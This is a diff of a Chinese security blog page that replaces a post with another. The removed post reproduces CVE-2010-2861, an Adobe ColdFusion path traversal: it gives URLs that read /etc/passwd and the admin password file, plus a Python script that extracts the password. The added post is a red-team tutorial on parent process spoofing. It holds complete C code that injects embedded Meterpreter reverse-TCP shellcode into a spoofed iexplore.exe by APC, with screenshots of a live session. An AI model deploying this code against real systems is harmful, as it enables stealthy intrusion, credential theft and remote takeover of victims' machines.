@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>CVE-2010-2861 recurrent | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="CVE-2010-2861 recurrent | 九世的博客">
+  <title>父进程伪造 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="父进程伪造 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1505,9 +1505,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-CVE-2010-2861-recurrent" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-父进程伪造" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">CVE-2010-2861 recurrent</h1>
+        <h1 class="article-title">父进程伪造</h1>
     
     <div class="article-meta">
         
@@ -1516,14 +1516,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-01-26 20:43</time>
+        创建时间:<time class="date" title="更新时间: 2020-10-23 14:52:52">2020-10-23 14:27</time>
         
     </div>
     <div class="article-meta">
@@ -1545,7 +1545,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -1560,53 +1560,160 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
-<p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。<br><img src="http://i1.hdslb.com/bfs/archive/4d62985cf8d97cf16775552450e995f622ac543c.jpg" alt="4d62985cf8d97cf16775552450e995f622ac543c.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>从<a href="https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a>下载好docker环境找到对应的CVE环境然后执行</p>
-<pre><code>docker-compose up -d
-</code></pre><p>之后访问</p>
-<pre><code>http://127.0.0.1:8500/
-</code></pre><p>看到以下：<br><img src="https://s2.ax1x.com/2019/01/26/kuEBb4.png" alt="kuEBb4.png"></p>
-<p>直接访问</p>
-<pre><code>读取/etc/passwd :http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en
-读取管理员密码：&lt;http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
-</code></pre><p>即可读取文件</p>
-<p>简单的漏洞检测脚本</p>
-<pre><code>&#39;&#39;&#39;&#39;
-author:九世
-time:2019/1/26
-source:https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/
-&#39;&#39;&#39;
+        <p>伪造父进程的关键点：</p>
+<pre><code>1. 寻找explorer.exe的pid，打开文件管理器的进程获取句柄 （寻找你要伪造进程的PID）
+2. 初始化指定的属性列表以创建进程和线程
+3. 设置进程属性
+</code></pre><p>关键函数主要是:</p>
+<ul>
+<li>OpenProcess</li>
+<li>InitializeProcThreadAttributeList</li>
+<li>CreateProcess</li>
+</ul>
+<p>还有个重要的结构体:STARTUPINFOEXA<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa</a><br>STARTUPINFOEXA结构体，微软文档定义如下：</p>
+<pre><code class="c">typedef struct _STARTUPINFOEXA {
+  STARTUPINFOA                 StartupInfo;
+  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
+} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/10/23/BAYZFS.png" alt="参数"></p>
+<p>InitializeProcThreadAttributeList用于初始化指定的属性列表以创建进程和线程<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist</a></p>
+<pre><code class="c">BOOL InitializeProcThreadAttributeList(
+  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
+  DWORD                        dwAttributeCount,
+  DWORD                        dwFlags,
+  PSIZE_T                      lpSize
+);
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/10/23/BAYUSJ.png" alt="参数"></p>
+<p>父进程伪造部分代码</p>
+<pre><code class="c">STARTUPINFOEXA sInfoEX;
+PROCESS_INFORMATION pInfo;
+SIZE_T sizeT;
 
-import requests
-import re
+HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限
 
-def exploit(url):
-    payload=&#39;/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en&#39;
-    guanjianzi=&#39;/bin/bash&#39;
-    payload2=&#39;/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en&#39;
-    urls=str(url).rstrip(&#39;/&#39;).strip()+payload
-    urls2=str(url).rstrip(&#39;/&#39;).strip()+payload2
-    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#39;}
-    try:
-        rqt=requests.get(url=urls,headers=headers,timeout=10)
-        if guanjianzi in rqt.text:
-            id=1
-            print(&#39;[+] Found CVE-2010-2861&#39;)
-        else:
-            id=0
-            print(&#39;[-] Not Found CVE-2018-2861&#39;)
-        uuid=id
-        if uuid&gt;0:
-            rqs=requests.get(url=urls2,headers=headers,timeout=10)
-            passwd=re.findall(&#39;password=[0-9-A-Z].*&#39;,rqs.text)
-            print(&#39;[+] administrator password:{}&#39;.format(passwd[0]))
-    except Exception as r:
-        print(&#39;[!] Error {}&#39;.format(r))
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/26/kuVBSP.md.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/01/26/kuEHPI.md.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/01/26/kuVRFs.png" alt="kuVRFs.png"></p>
-<p>转载请声明：转自422926799.github.io</p>
+ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组
+InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //第一次设置属性的数量
+sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性
+InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);
+UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。
+sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);
+</code></pre>
+<p>getParentProcessID函数用于寻找要伪造父进程pid</p>
+<pre><code class="c">DWORD getParentProcessID() { //返回explorer.exe的pid
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 process = { 0 };
+    process.dwSize = sizeof(process);
+
+    if (Process32First(snapshot, &amp;process)) {
+        do {
+            //If you want to another process as parent change here
+            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))
+                break;
+        } while (Process32Next(snapshot, &amp;process));
+    }
+
+    CloseHandle(snapshot);
+    return process.th32ProcessID;
+}
+</code></pre>
+<p>(使用APC的方式执行shellcode)<br>完整代码如下</p>
+<pre><code class="c">#include &quot;stdafx.h&quot;
+#include &lt;windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;iostream&gt;
+
+DWORD getParentProcessID() { //返回explorer.exe的pid
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 process = { 0 };
+    process.dwSize = sizeof(process);
+
+    if (Process32First(snapshot, &amp;process)) {
+        do {
+            //If you want to another process as parent change here
+            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))
+                break;
+        } while (Process32Next(snapshot, &amp;process));
+    }
+
+    CloseHandle(snapshot);
+    return process.th32ProcessID;
+}
+
+int main() {
+
+    //Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c
+    unsigned char shellCode[] =
+        &quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;
+        &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
+        &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
+        &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
+        &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
+        &quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;
+        &quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;
+        &quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41&quot;
+        &quot;\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1&quot;
+        &quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;
+        &quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;
+        &quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;
+        &quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;
+        &quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;
+        &quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;
+        &quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;
+        &quot;\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x71\x91\x41\x54\x49\x89\xe4&quot;
+        &quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;
+        &quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;
+        &quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;
+        &quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;
+        &quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;
+        &quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;
+        &quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;
+        &quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;
+        &quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;
+        &quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;
+        &quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;
+        &quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;
+        &quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;
+        &quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;
+        &quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;
+        &quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;
+        &quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;;
+
+
+
+
+    STARTUPINFOEXA sInfoEX;
+    PROCESS_INFORMATION pInfo;
+    SIZE_T sizeT;
+
+    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限
+
+    ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组
+    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //初始化指定的属性列表以创建进程和线程
+    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性并从堆中分配内存
+    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);
+    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。
+    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+    CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);
+
+    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //分配内存
+    SIZE_T *lpNumberOfBytesWritten = 0;
+    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten); //写入内存
+
+    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL); //APC调用
+    ResumeThread(pInfo.hThread); //启动线程
+    CloseHandle(pInfo.hThread); //关闭线程
+
+    return 0;
+}
+</code></pre>
+<p>效果如下<br><img src="https://s1.ax1x.com/2020/10/23/BANyxH.png" alt="父进程是explorer.exe"></p>
+<p><img src="https://s1.ax1x.com/2020/10/23/BANcMd.png" alt="通信"></p>
+<p><img src="https://s1.ax1x.com/2020/10/23/BANqLn.png" alt="meterpreter"></p>
+<p>参考链接:<br><a href="https://xz.aliyun.com/t/8387" target="_blank" rel="noopener">https://xz.aliyun.com/t/8387</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1616,12 +1723,12 @@ def exploit(url):
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>CVE-2010-2861 recurrent</p>
+    <p><span class="copy-title">文章标题:</span>父进程伪造</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-01-26, 20:43:10</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/81167905.html" title="CVE-2010-2861 recurrent">http://422926799.github.io/posts/81167905.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-10-23, 14:27:16</p>
+    <p><span class="copy-title">最后更新:</span>2020-10-23, 14:52:52</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/d0aae8a6.html" title="父进程伪造">http://422926799.github.io/posts/d0aae8a6.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
